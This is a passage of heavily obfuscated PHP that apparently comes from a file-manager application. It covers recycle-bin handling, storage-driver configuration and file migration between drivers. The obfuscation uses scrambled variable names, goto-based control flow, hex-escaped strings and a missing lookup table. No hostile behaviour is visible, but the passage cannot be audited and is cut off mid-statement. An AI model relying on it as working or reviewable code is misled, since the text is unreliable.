ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($bâòÅ—İ´œ, $b½àÙªñ…Õ) { $d„ã¤ÌãÔ =& $_SERVER[«¾°Ã¤]; if (isset(self::$_methodList[$bâòÅ—İ´œ])) { return @call_user_func_array(self::$_methodList[$bâòÅ—İ´œ], $b½àÙªñ…Õ); } else { if (method_exists($this, $bâòÅ—İ´œ)) { return call_user_func_array(array($this, $bâòÅ—İ´œ), $b½àÙªñ…Õ); } else { think_exception(__CLASS__ . $d„ã¤ÌãÔ[4] . $bâòÅ—İ´œ . $d„ã¤ÌãÔ[5]); } } } public static function __callStatic($B¯‹“§ëÁÁ, $d¤êÍİÊŞ) { if (isset(self::$_methodListStatic[$B¯‹“§ëÁÁ])) { return call_user_func_array(self::$_methodListStatic[$B¯‹“§ëÁÁ], $d¤êÍİÊŞ); } else { if (method_exists(self, $B¯‹“§ëÁÁ)) { return call_user_func_array(array(self, $B¯‹“§ëÁÁ), $d¤êÍİÊŞ); } else { show_json("{$B¯‹“§ëÁÁ}\x28\x29\x20\x6e\157\164\40\x65\170\x69\x73\x74\x3b", !1); } } } public static function addMethod($E¿İ¹­Êáø, $D‡äâ­ã¿…) { self::$_methodList[$E¿İ¹­Êáø] = $D‡äâ­ã¿…; } public static function addMethodStatic($a„™ç‡„Ö, $cëÇò‹°µ) { self::$_methodListStatic[$a„™ç‡„Ö] = $cëÇò‹°µ; } } goto B¯Æ‚„Õ§; B×‹ÅçñÛ‡: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\x63\x65\x5f\x72\x65\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\143\164\151\x6f\x6e")); public function listData($b›ñ«å¯ñ½ = false) { $BáÒ”İ†Ò† =& $_SERVER[«¾°Ã¤]; $b›ñ«å¯ñ½ = $b›ñ«å¯ñ½ ? $b›ñ«å¯ñ½ : USER_ID; $A†éù³»¶” = $this->where(array($BáÒ”İ†Ò†[1521] => $b›ñ«å¯ñ½))->select(); return array_to_keyvalue($A†éù³»¶”, $BáÒ”İ†Ò†[33], $BáÒ”İ†Ò†[404]); } public function moveToRecycle($E°ñŸ×òÈö) { goto fÉÆ÷éÌÔ; dÄ§è±Æğ¡: $this->recycleMove($E°ñŸ×òÈö, 1); if ($cÛ†Ø  ’ğ[$bÚğŞÔéÕ[412]] == $bÚğŞÔéÕ[87]) { $bôÑõš¾ = array($bÚğŞÔéÕ[562] => array($bÚğŞÔéÕ[521], $cÛ†Ø  ’ğ[$bÚğŞÔéÕ[496]] . $E°ñŸ×òÈö . $bÚğŞÔéÕ[522])); $EŒÉ«”ƒŸ”->where($bôÑõš¾)->setField($bÚğŞÔéÕ[432], 1); } goto DöÜ¨Íôòñ; bƒÚãÂÌ‚‰: if (!$cÛ†Ø  ’ğ || $cÛ†Ø  ’ğ[$bÚğŞÔéÕ[432]] == $bÚğŞÔéÕ[87]) { return; } $C š“èö…° = array($bÚğŞÔéÕ[419] => $E°ñŸ×òÈö, $bÚğŞÔéÕ[1521] => USER_ID, $bÚğŞÔéÕ[558] => $cÛ†Ø  ’ğ[$bÚğŞÔéÕ[413]], $bÚğŞÔéÕ[559] => $cÛ†Ø  ’ğ[$bÚğŞÔéÕ[493]], $bÚğŞÔéÕ[562] => $cÛ†Ø  ’ğ[$bÚğŞÔéÕ[496]]); $this->add($C š“èö…°); goto dÄ§è±Æğ¡; fÉÆ÷éÌÔ: $bÚğŞÔéÕ =& $_SERVER[«¾°Ã¤]; $EŒÉ«”ƒŸ” = Model($bÚğŞÔéÕ[1207]); $cÛ†Ø  ’ğ = $EŒÉ«”ƒŸ”->sourceInfo($E°ñŸ×òÈö); goto bƒÚãÂÌ‚‰; DöÜ¨Íôòñ: } public function clear() { $this->remove(!1); } public function remove($aÕîÔÀÁÛ° = false, $Aè¡ÑÃ°šÂ = false) { goto CéÛ‹ÑèÒ; FÒÇ ƒ†ÖŞ: $e¤Ï¿–Ÿ¡ğ = $this->listData($Aè¡ÑÃ°šÂ); $aÕîÔÀÁÛ° = $aÕîÔÀÁÛ° === !1 ? !1 : $aÕîÔÀÁÛ°; $eŒ¿¶÷¥­¾ = array(); goto D†„³Ÿ÷; CéÛ‹ÑèÒ: $dˆ¶µê×¬Ì =& $_SERVER[«¾°Ã¤]; $Aè¡ÑÃ°šÂ = $Aè¡ÑÃ°šÂ ? $Aè¡ÑÃ°šÂ : USER_ID; $cÅ´…¡‡¶— = Model($dˆ¶µê×¬Ì[1207]); goto FÒÇ ƒ†ÖŞ; D†„³Ÿ÷: foreach ($e¤Ï¿–Ÿ¡ğ as $AñâÎ§Â“ë) { if ($aÕîÔÀÁÛ° != !1 && !in_array($AñâÎ§Â“ë, $aÕîÔÀÁÛ°)) { continue; } $C÷¢Ä‘Èµ = $cÅ´…¡‡¶—->sourceInfo($AñâÎ§Â“ë); $cÅ´…¡‡¶—->remove($AñâÎ§Â“ë, !1); $E‹ˆİ‘Ùöà = $C÷¢Ä‘Èµ[$dˆ¶µê×¬Ì[413]] . $dˆ¶µê×¬Ì[71] . $C÷¢Ä‘Èµ[$dˆ¶µê×¬Ì[493]]; $eŒ¿¶÷¥­¾[$E‹ˆİ‘Ùöà] = array($dˆ¶µê×¬Ì[558] => $C÷¢Ä‘Èµ[$dˆ¶µê×¬Ì[413]], $dˆ¶µê×¬Ì[493] => $C÷¢Ä‘Èµ[$dˆ¶µê×¬Ì[493]]); $this->where(array($dˆ¶µê×¬Ì[404] => $AñâÎ§Â“ë))->delete(); } foreach ($eŒ¿¶÷¥­¾ as $BÛ¼¤«¨†) { $cÅ´…¡‡¶—->targetSpaceUpdate($BÛ¼¤«¨†[$dˆ¶µê×¬Ì[413]], $BÛ¼¤«¨†[$dˆ¶µê×¬Ì[493]]); } goto BÑÌÒÈ‹»; BÑÌÒÈ‹»: } public function restore($aÄ‰©ĞìØ = false) { $CÍ¢ˆ¾æƒŸ = $this->listData(); $this->_restoreSource($CÍ¢ˆ¾æƒŸ, $aÄ‰©ĞìØ); } public function removeUserAll($AäÃ™Äé) { $this->remove(!1, $AäÃ™Äé); } private function _restoreSource($a¸¦œ®©ë, $A‹æÙÙ§ÛÕ) { goto c­Ï»¢£¬ô; c­Ï»¢£¬ô: $fÉª«Õ”âà =& $_SERVER[«¾°Ã¤]; $b…ÏĞº†ì² = Model($fÉª«Õ”âà[1207]); $A‹æÙÙ§ÛÕ = $A‹æÙÙ§ÛÕ == !1 ? !1 : $A‹æÙÙ§ÛÕ; goto f«÷óÀàè‘; Aİ›¾Ó¶²¹: $b…ÏĞº†ì²->updateModifyTime($bãµùùÅØ); goto AæÛá¢•ºÍ; f«÷óÀàè‘: if (!$a¸¦œ®©ë) { return !0; } $bãµùùÅØ = array(); foreach ($a¸¦œ®©ë as $a“ƒÈÎ) { goto bù£ù—íÙŒ; eÒëŠÌÌÍ‡: $bãµùùÅØ[] = $AÔº™¹ ²ò[$fÉª«Õ”âà[487]]; if ($AÔº™¹ ²ò[$fÉª«Õ”âà[412]] == $fÉª«Õ”âà[87]) { $bãµùùÅØ[] = $a“ƒÈÎ; } $b…ÏĞº†ì²->lockMoveEnd($a“ƒÈÎ); goto DÕ²œÌŒ‘à; fÛÎÙìÓè: if ($AÔº™¹ ²ò[$fÉª«Õ”âà[412]] == $fÉª«Õ”âà[87]) { $EÒÙ‘ŠèËØ = array($fÉª«Õ”âà[562] => array($fÉª«Õ”âà[521], $AÔº™¹ ²ò[$fÉª«Õ”âà[496]] . $a“ƒÈÎ . $fÉª«Õ”âà[522])); $b…ÏĞº†ì²->where($EÒÙ‘ŠèËØ)->setField($fÉª«Õ”âà[432], 0); $this->restoreFolderChildren($a“ƒÈÎ, $a¸¦œ®©ë); } $this->where(array($fÉª«Õ”âà[404] => $a“ƒÈÎ))->delete(); $b…ÏĞº†ì²->folderSizeReset($AÔº™¹ ²ò[$fÉª«Õ”âà[487]]); goto eÒëŠÌÌÍ‡; bù£ù—íÙŒ: if ($A‹æÙÙ§ÛÕ != !1 && !in_array($a“ƒÈÎ, $A‹æÙÙ§ÛÕ)) { continue; } $AÔº™¹ ²ò = $b…ÏĞº†ì²->sourceInfo($a“ƒÈÎ); $a¸´…öéÈ = $b…ÏĞº†ì²->sourceInfo($AÔº™¹ ²ò[$fÉª«Õ”âà[487]]); goto F†³‡í‚´; F†³‡í‚´: if ($a¸´…öéÈ[$fÉª«Õ”âà[432]] == $fÉª«Õ”âà[87]) { continue; } $b…ÏĞº†ì²->lockMoveStart($a“ƒÈÎ); $this->recycleMove($a“ƒÈÎ, 0); goto fÛÎÙìÓè; DÕ²œÌŒ‘à: } goto Aİ›¾Ó¶²¹; AæÛá¢•ºÍ: } private function restoreFolderChildren($däñŸéóø™, $e÷ÁÒ¥ºå) { goto F‹ŞÓÕÆ; fïãØÑ´Ü: $EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[404]][1] = array_unique($EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[404]][1]); $EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[958]] = $fÒÌ´ì‹Ù’[1780]; $CÙ¡´“­ÓÚ->where($EèÜ÷ÏÓÙ‚)->setField($fÒÌ´ì‹Ù’[432], 1); goto eßƒ¼£Ÿ…—; Cñ”ƒˆé˜Á: foreach ($e÷ÁÒ¥ºå as $A’œŞø‡Œ°) { if ($A’œŞø‡Œ° == $däñŸéóø™) { continue; } if (!$CÙ¡´“­ÓÚ->isParentOf($däñŸéóø™, $A’œŞø‡Œ°)) { continue; } $dŠ–Ú ØˆÜ = $CÙ¡´“­ÓÚ->sourceInfo($A’œŞø‡Œ°); if ($dŠ–Ú ØˆÜ[$fÒÌ´ì‹Ù’[412]] == $fÒÌ´ì‹Ù’[87]) { $EèÜ÷ÏÓÙ‚[] = array($fÒÌ´ì‹Ù’[562] => array($fÒÌ´ì‹Ù’[521], $dŠ–Ú ØˆÜ[$fÒÌ´ì‹Ù’[496]] . $A’œŞø‡Œ° . $fÒÌ´ì‹Ù’[522])); } else { $EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[404]][1][] = $A’œŞø‡Œ°; } } if (!$EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[404]][1]) { unset($EèÜ÷ÏÓÙ‚[$fÒÌ´ì‹Ù’[404]]); } if (!$EèÜ÷ÏÓÙ‚) { return; } goto fïãØÑ´Ü; F‹ŞÓÕÆ: $fÒÌ´ì‹Ù’ =& $_SERVER[«¾°Ã¤]; $CÙ¡´“­ÓÚ = Model($fÒÌ´ì‹Ù’[1207]); $EèÜ÷ÏÓÙ‚ = array($fÒÌ´ì‹Ù’[404] => array($fÒÌ´ì‹Ù’[7], array())); goto Cñ”ƒˆé˜Á; eßƒ¼£Ÿ…—: } private function recycleMove($Aá—øÜä“, $A˜Ü¨‰‡˜ù = 1) { $D’èÖÏ‹°¤ =& $_SERVER[«¾°Ã¤]; $e¿ò‡µù‘ = Model($D’èÖÏ‹°¤[1207]); $AˆÄíÒæÀª = Model($D’èÖÏ‹°¤[1989]); $FƒÖ¥‚ê»‚ = array($D’èÖÏ‹°¤[404] => $Aá—øÜä“); if ($A˜Ü¨‰‡˜ù) { $e¿ò‡µù‘->where($FƒÖ¥‚ê»‚)->setField($D’èÖÏ‹°¤[432], 1); $AˆÄíÒæÀª->eventRecycle($Aá—øÜä“, $D’èÖÏ‹°¤[1990]); } else { $eñÄ†…†â‡ = $e¿ò‡µù‘->where($FƒÖ¥‚ê»‚)->find(); $cºÙªÑäÔœ = $eñÄ†…†â‡[$D’èÖÏ‹°¤[412]] == $D’èÖÏ‹°¤[87]; $B½½Ğ‰Ò„± = $e¿ò‡µù‘->fileNameAuto($eñÄ†…†â‡[$D’èÖÏ‹°¤[487]], $eñÄ†…†â‡[$D’èÖÏ‹°¤[28]], REPEAT_RENAME_FOLDER, $cºÙªÑäÔœ); if ($B½½Ğ‰Ò„± != $eñÄ†…†â‡[$D’èÖÏ‹°¤[28]]) { $e¿ò‡µù‘->rename($Aá—øÜä“, $B½½Ğ‰Ò„±); } $e¿ò‡µù‘->where($FƒÖ¥‚ê»‚)->setField($D’èÖÏ‹°¤[432], 0); $AˆÄíÒæÀª->eventRecycle($Aá—øÜä“, $D’èÖÏ‹°¤[1991]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\163\164\x6f\x72\141\x67\x65\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\x65\115\141\x78", "\163\x79\x73\164\145\155", "\x64\145\146\x61\165\154\164", "\x64\x72\151\x76\145\162", "\x63\x6f\156\x66\151\x67"); public function listData($a™Ó·®ô÷Ä = false, $aøˆöÇÄ» = "\x6d\157\x64\151\x66\171\124\x69\x6d\x65", $Eêˆ¬óöì˜ = false) { $c‹ Ó’ÃĞ¦ =& $_SERVER[«¾°Ã¤]; $cŸØà¶¿œ‡ = parent::listData($a™Ó·®ô÷Ä, $aøˆöÇÄ», $Eêˆ¬óöì˜); if ($a™Ó·®ô÷Ä) { return $cŸØà¶¿œ‡; } $B–Ìè±ÜÍÜ = $this->ioSizeUseGet(array_to_keyvalue($cŸØà¶¿œ‡, $c‹ Ó’ÃĞ¦[33], $c‹ Ó’ÃĞ¦[393])); foreach ($cŸØà¶¿œ‡ as $cĞ©š©šÜ => $ağìÌ¹„ì¦) { unset($cŸØà¶¿œ‡[$cĞ©š©šÜ][$c‹ Ó’ÃĞ¦[6]]); $cŸØà¶¿œ‡[$cĞ©š©šÜ][$c‹ Ó’ÃĞ¦[1679]] = isset($B–Ìè±ÜÍÜ[$ağìÌ¹„ì¦[$c‹ Ó’ÃĞ¦[393]]]) ? $B–Ìè±ÜÍÜ[$ağìÌ¹„ì¦[$c‹ Ó’ÃĞ¦[393]]] : 0; } return $cŸØà¶¿œ‡; } public function ioSizeUseGet($C¤£¤Õ´˜”) { goto c­“ê¦‹¨Ñ; AÀ±¥äÛ: Cache::set($c½ëÂôŠâ˜, $BŸÈ˜§Ì¶¦, 600); return $BŸÈ˜§Ì¶¦; goto B†Ñ§ã¼”Æ; c­“ê¦‹¨Ñ: $câğÃ”‡ ´ =& $_SERVER[«¾°Ã¤]; if (!$C¤£¤Õ´˜”) { return array(); } $c½ëÂôŠâ˜ = $câğÃ”‡ ´[1992] . implode($câğÃ”‡ ´[47], $C¤£¤Õ´˜”); goto dÛ”ª‰çÃÏ; a…ÄÉ ³¼ã: $aÕ¼ÀÙâ¶ = array($câğÃ”‡ ´[791] => array($câğÃ”‡ ´[7], $C¤£¤Õ´˜”)); $BŸÈ˜§Ì¶¦ = Model($câğÃ”‡ ´[756])->field($dÇé”†×÷)->where($aÕ¼ÀÙâ¶)->group($câğÃ”‡ ´[791])->select(); $BŸÈ˜§Ì¶¦ = array_to_keyvalue($BŸÈ˜§Ì¶¦, $câğÃ”‡ ´[393], $câğÃ”‡ ´[78]); goto AÀ±¥äÛ; dÛ”ª‰çÃÏ: $BŸÈ˜§Ì¶¦ = Cache::get($c½ëÂôŠâ˜); if ($BŸÈ˜§Ì¶¦) { return $BŸÈ˜§Ì¶¦; } $dÇé”†×÷ = array($câğÃ”‡ ´[791] => $câğÃ”‡ ´[393], $câğÃ”‡ ´[1993] => $câğÃ”‡ ´[78]); goto a…ÄÉ ³¼ã; B†Ñ§ã¼”Æ: } public function getConfig($A™Š§¯¢é˜) { $cŸ¿©ªåš• = parent::listData($A™Š§¯¢é˜); return json_decode($cŸ¿©ªåš•[$_SERVER[«¾°Ã¤][6]], !0); } public function update($eÏ…Ï†ï‰ï, $cÎÎâ¢ÏÙé) { goto cö„“Ç®Û; cö„“Ç®Û: $EÂ–Í¤ñŠô =& $_SERVER[«¾°Ã¤]; $FˆğäÑò¼Î = $cÎÎâ¢ÏÙé[$EÂ–Í¤ñŠô[28]]; $c„¡ßä§’Û = array_to_keyvalue(parent::listData(), $EÂ–Í¤ñŠô[28]); goto C“ò¼¶­•»; C™ô®±å­: $AõââêïöÀ = parent::update($eÏ…Ï†ï‰ï, $cÎÎâ¢ÏÙé); if ($AõââêïöÀ && $cÎÎâ¢ÏÙé[$EÂ–Í¤ñŠô[34]]) { foreach ($c„¡ßä§’Û as $e Î­Ê…Ú„) { if ($e Î­Ê…Ú„[$EÂ–Í¤ñŠô[34]] && $e Î­Ê…Ú„[$EÂ–Í¤ñŠô[393]] != $eÏ…Ï†ï‰ï) { parent::update($e Î­Ê…Ú„[$EÂ–Í¤ñŠô[393]], array($EÂ–Í¤ñŠô[34] => 0)); } } } return $AõââêïöÀ; goto A’¤Ê®²àó; C“ò¼¶­•»: if (isset($c„¡ßä§’Û[$FˆğäÑò¼Î]) && $c„¡ßä§’Û[$FˆğäÑò¼Î][$EÂ–Í¤ñŠô[393]] != $eÏ…Ï†ï‰ï) { return !1; } if (isset($cÎÎâ¢ÏÙé[$EÂ–Í¤ñŠô[1994]]) && $cÎÎâ¢ÏÙé[$EÂ–Í¤ñŠô[1994]] == $EÂ–Í¤ñŠô[87]) { $this->checkConfig($cÎÎâ¢ÏÙé); } unset($cÎÎâ¢ÏÙé[$EÂ–Í¤ñŠô[1994]]); goto C™ô®±å­; A’¤Ê®²àó: } public function add($DŸ¬’ÕÈÉ) { goto F™š¸ñÆÊ‰; Eß˜¹›œÉ: $this->checkConfig($DŸ¬’ÕÈÉ); $a÷õ“²Æö = parent::insert($DŸ¬’ÕÈÉ); if ($a÷õ“²Æö && $DŸ¬’ÕÈÉ[$DÔ¶êïƒÊñ[34]]) { foreach ($d¥ˆ½Ù¦‰ as $B‚†Á‚Õîƒ) { if ($B‚†Á‚Õîƒ[$DÔ¶êïƒÊñ[34]]) { parent::update($B‚†Á‚Õîƒ[$DÔ¶êïƒÊñ[393]], array($DÔ¶êïƒÊñ[34] => 0)); } } } goto e‘‰¶®ÛŒ–; e‘‰¶®ÛŒ–: return $a÷õ“²Æö; goto BñÊ‡‚¯™Å; F™š¸ñÆÊ‰: $DÔ¶êïƒÊñ =& $_SERVER[«¾°Ã¤]; $d¥ˆ½Ù¦‰ = array_to_keyvalue(parent::listData(), $DÔ¶êïƒÊñ[28]); if (isset($d¥ˆ½Ù¦‰[$DŸ¬’ÕÈÉ[$DÔ¶êïƒÊñ[28]]])) { return !1; } goto Eß˜¹›œÉ; BñÊ‡‚¯™Å: } public function checkConfig(&$aéãÕµË»ˆ, $d—Ë™ğ³™Ş = false) { goto Eäæ¢ìí¤¢; Eäæ¢ìí¤¢: $A‡æÈ²ñö¢ =& $_SERVER[«¾°Ã¤]; $C»Ã‘•Š¤ = strtolower($aéãÕµË»ˆ[$A‡æÈ²ñö¢[94]]); $c¤ÙˆÆ­ƒÆ = json_decode($aéãÕµË»ˆ[$A‡æÈ²ñö¢[6]], !0); goto AÊÚ÷ÁŞíª; Cñ¹éÖÉ¸Ü: $f‚îÚŒ–“„ = $b¢åéÑÁÔ->getPath($fÏñÃŸ‹‚‘ . $A‡æÈ²ñö¢[1139]); if (!$b¢åéÑÁÔ->mkfile($f‚îÚŒ–“„)) { if ($d—Ë™ğ³™Ş) { return LNG($A‡æÈ²ñö¢[1999]); } show_json(LNG($A‡æÈ²ñö¢[1999]), !1); } $c¤ÙˆÆ­ƒÆ[$A‡æÈ²ñö¢[1077]] = $fÏñÃŸ‹‚‘; goto CÌŒôê»ó; CÌŒôê»ó: $aéãÕµË»ˆ[$A‡æÈ²ñö¢[6]] = json_encode($c¤ÙˆÆ­ƒÆ); $aéãÕµË»ˆ[$A‡æÈ²ñö¢[94]] = $b ©õÒ¤œƒ; return !0; goto FíŸ­‹´è; a¡Ç‚·—‘Ù: $b ©õÒ¤œƒ = isset($b™’ìµÅ–[$C»Ã‘•Š¤]) ? $b™’ìµÅ–[$C»Ã‘•Š¤] : ucfirst($C»Ã‘•Š¤); $CØÁ¨Ç÷ = $A‡æÈ²ñö¢[72] . $b ©õÒ¤œƒ; if (!$b ©õÒ¤œƒ || !class_exists($CØÁ¨Ç÷)) { if ($d—Ë™ğ³™Ş) { return LNG($A‡æÈ²ñö¢[1996]); } write_log(array($A‡æÈ²ñö¢[1997], $aéãÕµË»ˆ, get_caller_info()), $A‡æÈ²ñö¢[1998]); show_json(LNG($A‡æÈ²ñö¢[1996]), !1, $aéãÕµË»ˆ); } goto A³ÖçÃà; AÊÚ÷ÁŞíª: foreach ($c¤ÙˆÆ­ƒÆ as $c‘÷ÑÆ‹Ç… => $d‡šòÈÉÙ) { $c¤ÙˆÆ­ƒÆ[$c‘÷ÑÆ‹Ç…] = trim($d‡šòÈÉÙ); } $c¤ÙˆÆ­ƒÆ[$A‡æÈ²ñö¢[1995]] = rand_string(6); $b™’ìµÅ– = $GLOBALS[$A‡æÈ²ñö¢[6]][$A‡æÈ²ñö¢[88]][$A‡æÈ²ñö¢[800]]; goto a¡Ç‚·—‘Ù; A³ÖçÃà: $b¢åéÑÁÔ = new $CØÁ¨Ç÷($c¤ÙˆÆ­ƒÆ); if (in_array($C»Ã‘•Š¤, $b¢åéÑÁÔ->objectDriver)) { if (!$b¢åéÑÁÔ->isBucketCors() && !$b¢åéÑÁÔ->setBucketCors()) { $Bê´›æÛÚ = LNG($A‡æÈ²ñö¢[1999]); $Bê´›æÛÚ .= $A‡æÈ²ñö¢[2000] . LNG($A‡æÈ²ñö¢[2001]); if ($d—Ë™ğ³™Ş) { return $Bê´›æÛÚ; } show_json($Bê´›æÛÚ, !1); } } $fÏñÃŸ‹‚‘ = rtrim($c¤ÙˆÆ­ƒÆ[$A‡æÈ²ñö¢[1077]], $A‡æÈ²ñö¢[8]) . $A‡æÈ²ñö¢[8]; goto Cñ¹éÖÉ¸Ü; FíŸ­‹´è: } public function driverListSystem() { $f¥‘¤—¡ï =& $_SERVER[«¾°Ã¤]; $A¥ë—šŒ¸ = parent::listData(); $fÓã¸«§¯‘ = array(); foreach ($A¥ë—šŒ¸ as $aÎãíˆÅÉğ) { unset($aÎãíˆÅÉğ[$f¥‘¤—¡ï[194]], $aÎãíˆÅÉğ[$f¥‘¤—¡ï[84]]); $aÎãíˆÅÉğ[$f¥‘¤—¡ï[6]] = json_decode($aÎãíˆÅÉğ[$f¥‘¤—¡ï[6]], !0); $fÓã¸«§¯‘[] = $aÎãíˆÅÉğ; } return $fÓã¸«§¯‘; } public function defaultDriver() { $C†î£ÖÒŸ¤ =& $_SERVER[«¾°Ã¤]; $Eë—“ôê’³ = parent::listData(); $aËÏä•¼Õ‘ = array_filter_by_field($Eë—“ôê’³, $C†î£ÖÒŸ¤[34], 1); $aËÏä•¼Õ‘ = $aËÏä•¼Õ‘[0]; if ($aËÏä•¼Õ‘) { $aËÏä•¼Õ‘[$C†î£ÖÒŸ¤[6]] = json_decode($aËÏä•¼Õ‘[$C†î£ÖÒŸ¤[6]], !0); } return $aËÏä•¼Õ‘; } public function driverInfo($a¡»¯Î—) { $E¹¤ƒáÆ¯¥ =& $_SERVER[«¾°Ã¤]; $Eğ­‡¤Ä‡ = array_to_keyvalue(parent::listData(), $E¹¤ƒáÆ¯¥[393]); if (!isset($Eğ­‡¤Ä‡[$a¡»¯Î—])) { return !1; } $dªµ—ÙÑİ = $Eğ­‡¤Ä‡[$a¡»¯Î—]; $dªµ—ÙÑİ[$E¹¤ƒáÆ¯¥[6]] = json_decode($dªµ—ÙÑİ[$E¹¤ƒáÆ¯¥[6]], !0); return $dªµ—ÙÑİ; } public function remove($F·ÛŸò¶åÁ) { $this->removeShareItems($F·ÛŸò¶åÁ); return parent::remove($F·ÛŸò¶åÁ); } public function removeWithFile($Câöé†Æ Ğ, $A®í•µ‘ÊÒ) { goto dÈæ£ÉÅ±‚; b­Ä‚Ÿª¼ö: $e—‹³çÀª… = Model($FÈˆ›‘Ş°Ù[193])->where($A†Úğ¹×ğÈ)->field($FÈˆ›‘Ş°Ù[2004])->select(); foreach ($e—‹³çÀª… as $b¼®ƒİªùá) { goto CæÊœéâÁ²; cÒ‰å¤ô“¦: $AòÒ‚ÙÂ = array($FÈˆ›‘Ş°Ù[791] => $FË¸éóÅÔ•, $FÈˆ›‘Ş°Ù[76] => $EÚˆ›‚­†Ê); Model($FÈˆ›‘Ş°Ù[193])->where($A†Úğ¹×ğÈ)->save($AòÒ‚ÙÂ); goto CèÑõË›®; FåËØÚã‘„: if (IO::exist($EÚˆ›‚­†Ê)) { $A±…™ÎÕŞ ->updateFileEnd($b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[28]], $b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[78]]); continue; } if (!IO::move($e¸¸ÌØŒš, get_path_father($EÚˆ›‚­†Ê))) { $A…¶¤‡¸Ê = !1; break; } $A†Úğ¹×ğÈ = array($FÈˆ›‘Ş°Ù[456] => $b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[456]]); goto cÒ‰å¤ô“¦; CæÊœéâÁ²: $e¸¸ÌØŒš = $b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[76]]; $EÚˆ›‚­†Ê = $böÎ°‡Öƒ§ . str_replace("\x7b\x69\x6f\72{$Câöé†Æ Ğ}\x7d\57", $FÈˆ›‘Ş°Ù[33], $e¸¸ÌØŒš); if (!IO::exist($e¸¸ÌØŒš)) { $eªõ—ùœàñ[] = $b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[456]]; $A±…™ÎÕŞ ->updateFileEnd($b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[28]], $b¼®ƒİªùá[$FÈˆ›‘Ş°Ù[78]]); continue; } goto FåËØÚã‘„; CèÑõË›®: } $this->removeByFileID($eªõ—ùœàñ); goto Dˆ©Ì”µå¿; Dˆ©Ì”µå¿: if (!$A…¶¤‡¸Ê) { $A±…™ÎÕŞ ->stop($AÏ²¹‰¬ÙĞ); return !1; } $A±…™ÎÕŞ ->end(); if ($A®í•µ‘ÊÒ == $FÈˆ›‘Ş°Ù[1659]) { $this->remove($Câöé†Æ Ğ); } goto BÛ·áî¿; dÈæ£ÉÅ±‚: $FÈˆ›‘Ş°Ù =& $_SERVER[«¾°Ã¤]; $A†Úğ¹×ğÈ = array($FÈˆ›‘Ş°Ù[791] => $Câöé†Æ Ğ); $Dò¿ŒÔ–íî = Model($FÈˆ›‘Ş°Ù[459])->where($A†Úğ¹×ğÈ)->count(); goto DÛÚ¶©áÍÇ; Fá©²¿³Ü‚: $A±…™ÎÕŞ ->task[$FÈˆ›‘Ş°Ù[732]] = (double) $DÎÇ˜®Šâ; $Båµµ‘×ƒÍ = KodIO::defaultDriver(); $FË¸éóÅÔ• = $Båµµ‘×ƒÍ[$FÈˆ›‘Ş°Ù[393]]; goto CÇ•£˜ˆÑİ; CÇ•£˜ˆÑİ: $böÎ°‡Öƒ§ = "\173\x69\x6f\x3a{$FË¸éóÅÔ•}\175\x2f"; $A…¶¤‡¸Ê = !0; $eªõ—ùœàñ = array(); goto b­Ä‚Ÿª¼ö; DÛÚ¶©áÍÇ: $DÎÇ˜®Šâ = Model($FÈˆ›‘Ş°Ù[459])->where($A†Úğ¹×ğÈ)->sum($FÈˆ›‘Ş°Ù[78]); $AÏ²¹‰¬ÙĞ = $A®í•µ‘ÊÒ . $FÈˆ›‘Ş°Ù[2002] . $Câöé†Æ Ğ; $A±…™ÎÕŞ  = new TaskFileTransfer($AÏ²¹‰¬ÙĞ, $FÈˆ›‘Ş°Ù[1998], $Dò¿ŒÔ–íî, LNG($FÈˆ›‘Ş°Ù[2003]) . "\50{$Câöé†Æ Ğ}\x29"); goto Fá©²¿³Ü‚; BÛ·áî¿: } public function progress($CºÍó½‚Š•, $BŠ¿›ùƒÂ’) { return Task::get($BŠ¿›ùƒÂ’ . $_SERVER[«¾°Ã¤][2002] . $CºÍó½‚Š•); } private function removeByFileID($cÔ×«®Àğ” = array()) { goto CŠ‡¤ê—Ş¯; B¯Òïø–Òƒ: $D¤“ÚíÆ¥È = Model($f†ëÂ±Ì°¹[1207])->where($CßíÊìå³)->field($f†ëÂ±Ì°¹[404])->select(); if (!$D¤“ÚíÆ¥È) { return; } $D¤“ÚíÆ¥È = array_to_keyvalue($D¤“ÚíÆ¥È, $f†ëÂ±Ì°¹[33], $f†ëÂ±Ì°¹[404]); goto CĞÄ»Â”âÕ; CŠ‡¤ê—Ş¯: $f†ëÂ±Ì°¹ =& $_SERVER[«¾°Ã¤]; if (empty($cÔ×«®Àğ”)) { return; } $CßíÊìå³ = array($f†ëÂ±Ì°¹[456] => array($f†ëÂ±Ì°¹[7], $cÔ×«®Àğ”)); goto B¯Òïø–Òƒ; CĞÄ»Â”âÕ: foreach ($D¤“ÚíÆ¥È as $aùÂ÷Õº¨) { Model($f†ëÂ±Ì°¹[418])->removeNow($aùÂ÷Õº¨, !1); } goto Aïƒ„ôİÉ; Aïƒ„ôİÉ: } private function removeShareItems($bÖÔ›ÌßÃ…) { goto dØÎ³À’¯; D…ÒğÓ›ğò: $FéùÍÚÌ‡ô = Model($B˜÷™í™œ[1670])->where($B¯½â±™ã)->field($B˜÷™í™œ[477])->select(); if (empty($FéùÍÚÌ‡ô)) { return; } $c«ìßÕ¿—ğ = array_to_keyvalue($FéùÍÚÌ‡ô, $B˜÷™í™œ[33], $B˜÷™í™œ[477]); goto BÈ¤† ºØ‚; dØÎ³À’¯: $B˜÷™í™œ =& $_SERVER[«¾°Ã¤]; $E”Äéãà° = "\x7b\151\x6f\72{$bÖÔ›ÌßÃ…}\x7d\57"; $B¯½â±™ã = array($B˜÷™í™œ[404] => 0, $B˜÷™í™œ[1072] => array($B˜÷™í™œ[380], 